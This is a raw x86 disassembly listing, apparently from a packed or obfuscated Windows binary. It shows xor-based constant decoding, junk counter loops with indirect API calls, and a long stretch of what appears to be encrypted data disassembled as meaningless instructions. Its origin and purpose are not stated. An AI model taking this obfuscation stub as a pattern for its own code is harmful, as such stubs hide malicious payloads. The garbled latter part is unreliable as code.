  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e644
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x4302dd,0x14
  4098db:	cmp    DWORD PTR ds:0x4302dd,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x4302dd,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42eab3
  40991f:	mov    eax,ds:0x4302dd
  409924:	dec    eax
  409925:	mov    ds:0x4302dd,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x430357
  409934:	or     eax,DWORD PTR ds:0x43035f
  40993a:	mov    ds:0x430357,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e650,0x13
  40994c:	cmp    DWORD PTR ds:0x42e650,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e650,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42eab7
  409979:	mov    ecx,DWORD PTR ds:0x42e650
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e650,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x4302c9,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x4302d9,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x43034f,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x43034f
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x43034f,edi
  4099bf:	cmp    DWORD PTR ds:0x43034f,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x4302bd
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42e947
  4099e8:	cmp    DWORD PTR ds:0x43034f,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x43034f
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x43034f,edi
  409a02:	cmp    DWORD PTR ds:0x43034f,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x43035f,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x4302b5,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x4302b5
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x4302b5,ebx
  409a35:	cmp    DWORD PTR ds:0x4302b5,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42e883
  409a50:	cmp    DWORD PTR ds:0x4302b5,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x4302b5
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x4302b5,ebx
  409a6a:	cmp    DWORD PTR ds:0x4302b5,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e648
  409a7d:	or     DWORD PTR ds:0x42ec4b,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	les    ecx,FWORD PTR [ebx]
  409a96:	inc    eax
  409a97:	pusha  
  409a98:	pop    ecx
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409ae1
  409aa1:	sbb    ah,ch
  409aa3:	and    DWORD PTR [ebp+0x7821d9c4],ecx
  409aa9:	cmp    edi,DWORD PTR [esi+0x5b3eca1d]
  409aaf:	test   BYTE PTR [edi-0x3fc3e798],bl
  409ab5:	stos   DWORD PTR es:[edi],eax
  409ab6:	int    0xd2
  409ab8:	loopne 0x409a7f
  409aba:	add    eax,0xd12c90b5
  409abf:	sbb    al,0xdb
  409ac1:	fldenv [esi]
  409ac3:	push   0x5b
  409ac5:	xchg   edx,eax
  409ac6:	popa   
  409ac7:	dec    esp
  409ac8:	pop    ebx
  409ac9:	or     eax,0x988d43f4
  409ace:	fcomp  DWORD PTR [ecx-0x75]
  409ad1:	rcr    bl,1
  409ad3:	xchg   BYTE PTR [edx+0x3b029619],ah
  409ad9:	(bad)  
  409ada:	jmp    0x409ad1
  409adc:	jns    0x409a75
  409ade:	inc    eax
  409adf:	enter  0xfc2e,0xfd
  409ae3:	push   ebp
  409ae4:	test   BYTE PTR [edx+ecx*1],0xd8
  409ae8:	and    esp,DWORD PTR [edx]
  409aea:	xchg   edx,eax
  409aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aec:	fcomp  st(1)
  409aee:	jb     0x409b41
  409af0:	jecxz  0x409acd
  409af2:	dec    edx
  409af3:	push   esi
  409af4:	mov    ebx,DWORD PTR [ecx-0x38]
  409af7:	sub    ah,cl
  409af9:	add    BYTE PTR [ebx],0xc2
  409afc:	bnd ret 0x3f94
  409b00:	clc    
  409b01:	out    0xd3,al
  409b03:	shl    bh,1
  409b05:	sub    esp,esp
  409b07:	dec    ebp
  409b08:	sahf   
  409b09:	mov    ebp,0x66d3a821
  409b0e:	lods   al,BYTE PTR ds:[esi]
  409b0f:	call   0x52fe:0x795fe266
  409b16:	and    BYTE PTR [ecx+ebp*4+0x3],dh
  409b1a:	or     ecx,eax
  409b1c:	test   BYTE PTR ds:0x97357c1b,dh
  409b22:	fnsave [edi-0x2c]
  409b25:	sbb    DWORD PTR [ecx+eax*2-0x75],ecx
  409b29:	adc    ah,BYTE PTR [edx+0x2e]
  409b2c:	leave  
  409b2d:	jne    0x409ad3
  409b2f:	lahf   
  409b30:	xlat   BYTE PTR gs:[ebx]
  409b32:	nop
  409b33:	bound  ebp,QWORD PTR [ebp-0x20]
  409b36:	xchg   ebx,eax
  409b37:	ja     0x409afb
  409b39:	inc    ebx
  409b3a:	mov    WORD PTR [ebx+ebp*4+0x39e38ccf],?
  409b41:	push   ebx
  409b42:	retf   0x7998
  409b45:	xchg   ebx,eax
  409b46:	jp     0x409b57
  409b48:	(bad)  
  409b49:	jmp    DWORD PTR [ebp+0x7f]
  409b4c:	mov    BYTE PTR [edi+0x3],cl
  409b4f:	sbb    esp,edx
  409b51:	xchg   ebx,eax
  409b52:	mov    esi,0x9dc39457
  409b57:	jecxz  0x409b06
  409b59:	and    al,0x86
  409b5b:	jne    0x409b90
  409b5d:	aad    0x59
  409b5f:	lahf   
  409b60:	push   cs
  409b61:	push   0xffffffe6
  409b63:	inc    esp
  409b64:	inc    ebx
  409b65:	cld    
  409b66:	cdq    
  409b67:	lods   al,BYTE PTR ds:[esi]
  409b68:	pushf  
  409b69:	(bad)  
  409b6a:	fstp   DWORD PTR [eax-0x76]
  409b6d:	add    al,0x87
  409b6f:	pop    es
  409b70:	add    DWORD PTR [eax+0x51417f8c],edi
  409b76:	aaa    
  409b77:	pop    edx
  409b78:	mov    BYTE PTR [ebp-0x6983ad23],dh
  409b7e:	lods   eax,DWORD PTR ds:[esi]
  409b7f:	cmp    bl,BYTE PTR [esi-0x6f]
  409b82:	test   ecx,ebp
  409b84:	push   ecx
  409b85:	repz or ecx,DWORD PTR [esi-0x1f1c69fe]
  409b8c:	ret    
  409b8d:	add    BYTE PTR [ebp-0xd3f154c],al
  409b93:	cmp    BYTE PTR [edx],dl
  409b95:	sub    BYTE PTR [edi],ch
  409b97:	push   ds
  409b98:	jb     0x409b99
  409b9a:	push   cs
  409b9b:	cdq    
  409b9c:	rol    BYTE PTR [ecx],cl
  409b9e:	stc    
  409b9f:	sub    esp,esi
  409ba1:	push   ebp
  409ba2:	int3   
  409ba3:	xchg   ebx,eax
  409ba4:	jo     0x409bc0
  409ba6:	or     ah,BYTE PTR [eax+0x9560f94]
  409bac:	nop
  409bad:	and    ebx,DWORD PTR [eax]
  409baf:	xchg   BYTE PTR [ebp+0x58],al
  409bb2:	sbb    cl,BYTE PTR [esi+ebp*2]
  409bb5:	mov    al,0xc2
  409bb7:	out    dx,al
  409bb8:	ss jnp 0x409ba9
  409bbb:	xchg   BYTE PTR [ebx+edx*8-0x76],dh
  409bbf:	retf   0x6ccc
  409bc2:	jns    0x409be1
  409bc4:	sbb    eax,DWORD PTR [edi]
  409bc6:	jl     0x409c38
  409bc8:	inc    esp
  409bc9:	cmp    BYTE PTR [esi-0x649b2a7d],dl
  409bcf:	mov    bh,0x1b
  409bd1:	sub    cl,BYTE PTR [ebx+0x5f]
  409bd4:	fild   QWORD PTR [eax-0xc]
  409bd7:	xlat   BYTE PTR ds:[ebx]
  409bd8:	cmp    esi,DWORD PTR [ecx+0x59]
  409bdb:	jp     0x409ba1
  409bdd:	test   eax,0xee195d5f
  409be2:	cmp    esi,DWORD PTR [eax-0x11]
  409be5:	adc    eax,0x4175761c
  409bea:	push   cs
  409beb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bec:	jbe    0x409be2
  409bee:	jp     0x409bb4
  409bf0:	sub    bl,BYTE PTR [ecx+0x1f2d4ee9]
  409bf6:	mov    cl,0xd9
  409bf8:	jmp    0x161e:0x4a2c23ec
  409bff:	mov    ?,WORD PTR [ebx+0x5719c672]
  409c05:	ds cmp ecx,ecx
  409c08:	inc    esp
  409c09:	jmp    0x2c38:0x8f41ad9
  409c10:	js     0x409bd8
  409c12:	pop    ecx
  409c13:	xlat   BYTE PTR ds:[ebx]
  409c14:	mov    al,ds:0x4c2f92cf
  409c19:	pop    eax
  409c1a:	xchg   BYTE PTR gs:[esp+eax*4-0x2],al
  409c1f:	push   ebp
  409c20:	sbb    BYTE PTR [eax+0x2c3483c9],cl
  409c26:	ss cs lahf 
  409c29:	mov    ebp,0x5c68a7a7
  409c2e:	mov    al,0x76
  409c30:	xor    al,0xb2
  409c32:	cmp    DWORD PTR [ecx+edi*2+0x22],esi
  409c36:	jmp    0x3da3665d
  409c3b:	push   esp
  409c3c:	popa   
  409c3d:	(bad)  
  409c3e:	daa    
  409c3f:	push   0xfffffffe
  409c41:	jl     0x409c7e
  409c43:	sub    al,ah
  409c45:	stos   BYTE PTR es:[edi],al
  409c46:	and    eax,0x45db30f2
  409c4b:	jmp    FWORD PTR [ebp+0x19]
  409c4e:	(bad)  
  409c4f:	ret    0x3cae
  409c52:	push   cs
  409c53:	xchg   al,dh
  409c55:	adc    al,cl
  409c57:	(bad)  
  409c58:	cmp    cl,bl
  409c5a:	xchg   BYTE PTR [edx],cl
  409c5c:	mov    eax,ds:0x4b5d936d
  409c61:	sub    eax,0xeef1ced4
  409c66:	aad    0xe4
  409c68:	pop    ebx
  409c69:	jp     0x409cbe
  409c6b:	imul   ecx,DWORD PTR [edi*1-0x74abb465],0xffffffd3
  409c73:	rcr    DWORD PTR [ecx-0x14],1
  409c76:	inc    esp
  409c77:	dec    edi
  409c78:	dec    eax
  409c79:	scas   eax,DWORD PTR es:[edi]
  409c7a:	jbe    0x409cd8
  409c7c:	clc    
  409c7d:	idiv   DWORD PTR [edi]
  409c7f:	sub    DWORD PTR ds:0x640971e0,esi
  409c85:	imul   edi,DWORD PTR ds:0xbdbbf5e9,0xffffffef
  409c8c:	std    
  409c8d:	(bad)  
  409c8f:	xor    DWORD PTR [ebx],edi
  409c91:	mov    eax,ds:0x31827872
  409c96:	sti    
  409c97:	fild   DWORD PTR [ebx+0xe]
  409c9a:	or     al,0xbf
  409c9c:	add    al,0x9a
  409c9e:	fiadd  WORD PTR [eax]
  409ca0:	pop    eax
  409ca1:	js     0x409ca9
  409ca3:	pushf  
  409ca4:	cdq    
  409ca5:	cdq    
  409ca6:	je     0x409c82
  409ca8:	call   FWORD PTR [edx+0x2ce02a36]
  409cae:	std    
  409caf:	and    cl,BYTE PTR [ebx+0x23]
  409cb2:	xor    bh,BYTE PTR [edi-0x9]
  409cb5:	scas   eax,DWORD PTR es:[edi]
  409cb6:	aas    
  409cb7:	jmp    0x409d32
  409cb9:	pop    ebp
  409cba:	xor    BYTE PTR [edx],dh
  409cbc:	ds ret 
  409cbe:	test   edi,0xbb2db9fb
  409cc4:	mov    DWORD PTR [edx],ebp
  409cc6:	pop    edx
  409cc7:	call   0xbbbda0bd
  409ccc:	jmp    0x8e5b:0x2843c8a2
  409cd3:	mov    eax,0x5f3196e2
  409cd8:	adc    BYTE PTR [edi+edx*1-0x24],dh
  409cdc:	jge    0x409d46
  409cde:	xchg   ebp,eax
  409cdf:	or     ebp,DWORD PTR [ebx-0x480dfe7]
  409ce5:	cmp    al,BYTE PTR [ebx+esi*4+0x1de6aed8]
  409cec:	sbb    al,0xbe
  409cee:	cld    
  409cef:	pop    esp
  409cf0:	jno    0x409d26
  409cf2:	js     0x409cab
  409cf4:	enter  0x2c20,0x65
  409cf8:	popa   
  409cf9:	sbb    BYTE PTR [edx-0x16929d44],dh
  409cff:	or     DWORD PTR [edi+ebp*2],edx
  409d02:	popa   
  409d03:	mov    bl,0x3d
  409d05:	cmc    
  409d06:	nop
  409d07:	sar    BYTE PTR [eax+0xb],1
  409d0a:	mov    dh,0x68
  409d0c:	mov    esi,0x6c8ceeb1
  409d11:	and    BYTE PTR [esi],ch
  409d13:	mov    ebp,ecx
  409d15:	push   ebx
  409d16:	sbb    DWORD PTR [ebx-0x7c],0xc787012d
  409d1d:	add    al,bl
  409d1f:	lea    esp,[edi-0x5418b85c]
  409d25:	pop    edx
  409d26:	push   es
  409d27:	inc    esi
  409d28:	test   dl,al
  409d2a:	cmp    ebx,DWORD PTR [ebp+0x6e4d828d]
  409d30:	push   ebx
  409d31:	clc    
  409d32:	nop
  409d33:	mov    cl,ch
  409d35:	in     eax,dx
  409d36:	pop    ss
  409d37:	dec    esi
  409d38:	inc    ecx
  409d39:	mov    ds:0x18748d3e,eax
  409d3e:	cwde   
  409d3f:	push   esi
  409d40:	push   0x75130ec2
  409d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d46:	enter  0x701d,0xfa
  409d4a:	mov    ch,0xc4
  409d4c:	test   DWORD PTR [ebx],eax
  409d4e:	pop    ebx
  409d4f:	(bad)  
  409d51:	pop    esi
  409d52:	bound  esi,QWORD PTR [edx+0x61602b2f]
  409d58:	ds pop ebx
  409d5a:	mov    edi,0xdb8df0ce
  409d5f:	icebp  
  409d60:	and    ebp,ecx
  409d62:	pop    ebp
  409d63:	mov    ds:0x2d7f68f7,eax
  409d68:	fnstenv [ebx+0x78]
  409d6b:	dec    esp
  409d6c:	inc    esi
  409d6d:	xchg   BYTE PTR [eax+0x1a2e72af],ah
  409d73:	bound  esi,QWORD PTR [ecx-0x4ca07fa3]
  409d79:	sbb    DWORD PTR [ebx+0x39],eax
  409d7c:	shl    BYTE PTR [ecx-0x6c],cl
  409d7f:	sbb    ch,bh
  409d81:	mov    eax,0x5d606797
  409d86:	in     al,dx
  409d87:	cmc    
  409d88:	xor    BYTE PTR [eax],ch
  409d8a:	sahf   
  409d8b:	or     al,0x65
  409d8d:	jae    0x409d92
  409d8f:	xor    bh,BYTE PTR [ebx]
  409d91:	mov    al,0xdd
  409d93:	int    0xe2
  409d95:	cmp    eax,0x1f973902
  409d9a:	jbe    0x409d8c
  409d9c:	cmc    
  409d9d:	lock std 
  409d9f:	arpl   WORD PTR [ebp-0x54194195],bx
  409da5:	pop    edx
  409da6:	imul   esp,DWORD PTR [edi-0x41943048],0xffffffda
  409dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dae:	mov    esi,0x5da71181
  409db3:	je     0x409d5d
  409db5:	imul   DWORD PTR [eax]
  409db7:	sbb    ebx,eax
  409db9:	push   0x4f4df4ec
  409dbe:	lods   eax,DWORD PTR ds:[esi]
  409dbf:	cmp    bh,BYTE PTR [ecx-0x5b]
  409dc2:	cmp    BYTE PTR [edx+0x21],ch
  409dc5:	mov    ebp,0x57b79d36
  409dca:	add    ebx,esi
  409dcc:	xor    edx,0x8
  409dcf:	adc    eax,0x1d8bc703
  409dd4:	pop    eax
  409dd5:	out    0x42,al
  409dd7:	add    BYTE PTR [ebx],al
  409dd9:	sbb    eax,0x430357
  409dde:	mov    DWORD PTR ds:0x42e658,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x4302dd,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x43034f,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x4302d1
  409e03:	and    DWORD PTR ds:0x4302f1,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x4302cd,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e60
  409e2b:	fild   WORD PTR fs:[edi]
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e7c
  409e37:	adc    eax,0xe7fb526e
  409e3c:	pop    ebp
  409e3d:	sub    edx,DWORD PTR [eax+edi*8]
  409e40:	push   es
  409e41:	adc    DWORD PTR [eax],ecx
  409e43:	test   eax,0xfe59bd91
  409e48:	js     0x409df5
  409e4a:	mov    edx,0x8d9e9cd1
  409e4f:	sbb    BYTE PTR [ebx-0x712d9f37],0x6f
  409e56:	and    DWORD PTR [edi-0x46097180],ecx
  409e5c:	mov    edi,cs
  409e5e:	push   ecx
  409e5f:	xchg   DWORD PTR [ecx-0x607ab268],esp
  409e65:	push   edi
  409e66:	(bad)
  409e69:	push   ecx
  409e6a:	adc    eax,0x7fd3a652
  409e6f:	out    0xd0,eax
  409e71:	test   edx,ecx
  409e73:	jp     0x409e28
  409e75:	jl     0x409edd
  409e77:	into   
  409e78:	(bad)  
  409e7a:	aad    0x9a
  409e7c:	xchg   esp,eax
  409e7d:	and    al,0x10
  409e7f:	mov    cl,0xa3
  409e81:	mov    cl,0x2c
  409e83:	fidivr DWORD PTR [ebx]
  409e85:	jae    0x409e7b
  409e87:	sub    al,0xda
  409e89:	(bad)  
  409e8a:	lds    esi,FWORD PTR [eax-0x35]
  409e8d:	jae    0x409e46
  409e8f:	push   eax
  409e90:	inc    edx
  409e91:	sbb    esi,eax
  409e93:	int    0x9c
  409e95:	scas   eax,DWORD PTR es:[edi]
  409e96:	pushf  
  409e97:	push   0x9
  409e99:	pop    eax
  409e9a:	(bad)  
  409e9b:	mov    al,0x31
  409e9d:	fs sub al,0xf9
  409ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ea1:	dec    eax
  409ea2:	inc    eax
  409ea3:	mov    ds:0x31863876,al
  409ea8:	push   0xc72b6a43
  409ead:	outs   dx,BYTE PTR ds:[esi]
  409eae:	pop    eax
  409eaf:	and    edi,eax
  409eb1:	or     al,0xda
  409eb3:	int    0x51
  409eb5:	dec    esp
  409eb6:	cdq    
  409eb7:	outs   dx,DWORD PTR ds:[esi]
  409eb8:	bound  ebp,QWORD PTR [edi+ebx*1+0xca65f6b]
  409ebf:	lea    eax,ds:[esi+0x624f2ca4]
  409ec6:	mov    ebp,0x2ffe8da6
  409ecb:	pop    ebx
  409ecc:	push   esp
  409ecd:	data16 cli 
  409ecf:	and    BYTE PTR [esi-0x37],dh
  409ed2:	sar    BYTE PTR ds:[ebp+0x1cc79978],cl
  409ed9:	retf   0x118c
  409edc:	or     dh,ah
  409ede:	mov    dh,0xd7
  409ee0:	test   eax,0x8a67e43c
  409ee5:	div    BYTE PTR [esi+ebp*8-0x1a391053]
  409eec:	jmp    0x4fc0cea9
  409ef1:	sbb    BYTE PTR [ebp-0x74],bh
  409ef4:	stos   DWORD PTR es:[edi],eax
  409ef5:	add    eax,0x24c7d084
  409efa:	repnz stos DWORD PTR es:[edi],eax
  409efc:	jno    0x409e8e
  409efe:	or     ebx,ebx
  409f00:	xchg   BYTE PTR [ebx],al
  409f02:	sbb    ebx,DWORD PTR [eax-0x4cfd6bf9]
  409f08:	mov    BYTE PTR [ebp+0x75],cl
  409f0b:	aas    
  409f0c:	jno    0x409f02
  409f0e:	mov    al,ds:0x4a9b5560
  409f13:	add    BYTE PTR [edi+0x308ff613],0xb5
  409f1a:	fcmovu st,st(2)
  409f1c:	ror    BYTE PTR [edx-0x76],0xf0
  409f20:	push   ecx
  409f21:	cmp    DWORD PTR [esi],eax
  409f23:	arpl   WORD PTR [edi-0x96195ef],bx
  409f29:	js     0x409f2d
  409f2b:	loope  0x409ec1
  409f2d:	lods   eax,DWORD PTR ds:[esi]
  409f2e:	push   ebp
  409f2f:	ds add eax,0x9c75a2d3
  409f35:	bound  ebp,QWORD PTR [ecx]
  409f37:	call   0x703a:0x6408ff38
  409f3e:	adc    DWORD PTR gs:[ecx-0x70137328],0xfffffffb
  409f46:	outs   dx,DWORD PTR ds:[esi]
  409f47:	adc    eax,0x56cfec97
  409f4c:	inc    ecx
  409f4d:	jb     0x409f32
  409f4f:	jle    0x409f83
  409f51:	or     DWORD PTR [edi+0x6f24e2b6],ecx
  409f57:	inc    edi
  409f58:	stos   DWORD PTR es:[edi],eax
  409f59:	mov    BYTE PTR [edx],0x5c
  409f5c:	pop    ds
  409f5d:	outs   dx,DWORD PTR ds:[esi]
  409f5e:	pop    es
  409f5f:	xchg   edx,eax
  409f60:	add    al,0x7a
  409f62:	fiadd  DWORD PTR [eax-0x61]
  409f65:	sub    bh,BYTE PTR [ebp-0xa07a275]
  409f6b:	add    eax,0x8a8ac2b8
  409f70:	shl    BYTE PTR [ebx],cl
  409f72:	int    0xd8
  409f74:	aas    
  409f75:	inc    ecx
  409f76:	push   edx
  409f77:	and    BYTE PTR [edi],0x4d
  409f7a:	dec    edx
  409f7b:	popa   
  409f7c:	and    dh,BYTE PTR [eax-0x80]
  409f7f:	sub    eax,0x419ac1bf
  409f84:	test   BYTE PTR [esp+ebx*1+0x18],bh
  409f88:	in     eax,dx
  409f89:	shl    DWORD PTR [esi-0x490c04c8],0x2c
  409f90:	add    al,0x5a
  409f92:	addr16 pop ss
  409f94:	icebp  
  409f95:	cmp    ch,dh
  409f97:	push   ebx
  409f98:	dec    esi
  409f99:	aam    0x17
  409f9b:	inc    esi
  409f9c:	neg    DWORD PTR [ecx-0x1f]
  409f9f:	adc    al,BYTE PTR [edx-0x6543531b]
  409fa5:	mov    BYTE PTR [ebp-0x75afe94d],ah
  409fab:	mov    eax,0x4134127d
  409fb0:	mov    bl,0xd1
  409fb2:	sub    dh,BYTE PTR [esi+0x2f]
  409fb5:	jo     0x409f9c
  409fb7:	xor    eax,0x22f298e4
  409fbc:	pop    esi
  409fbd:	jmp    esi
  409fbf:	jo     0x409f9d
  409fc1:	mov    ch,0x66
  409fc3:	sub    al,0x74
  409fc5:	jno    0x409fa2
  409fc7:	xchg   esp,eax
  409fc8:	mov    al,0xee
  409fca:	addr16 mov eax,esi
  409fcd:	mov    BYTE PTR [ebx+0x3],al
  409fd0:	callw  0xc312
  409fd4:	(bad)  
  409fd5:	frstor [eax]
  409fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd8:	outs   dx,DWORD PTR ds:[esi]
  409fd9:	adc    edi,ecx
  409fdb:	add    eax,0x9a20ca0e
  409fe0:	(bad)  
  409fe1:	jo     0x40a05a
  409fe3:	pop    esp
  409fe4:	cld    
  409fe5:	cmp    BYTE PTR [ebp+0x4b],dh
  409fe8:	or     bh,dh
  409fea:	outs   dx,BYTE PTR ds:[esi]
  409feb:	mov    al,0xb6
  409fed:	or     eax,DWORD PTR [ecx]
  409fef:	cmp    WORD PTR [edi+eax*4-0x5a935587],di
  409ff7:	ret    
  409ff8:	test   DWORD PTR [edx],esi
  409ffa:	jmp    0x93e1:0xf32c9f5d
  40a001:	popf   
  40a002:	jmp    0x5c27090e
  40a007:	mov    ebx,0x36fdacd7
  40a00c:	sbb    DWORD PTR [eax-0x1d],esp
  40a00f:	xchg   esp,eax
  40a010:	outs   dx,BYTE PTR ds:[esi]
  40a011:	xor    eax,0x1d2c6410
  40a016:	enter  0x9831,0xbd
  40a01a:	and    bl,BYTE PTR [eax]
  40a01c:	sub    al,0x21
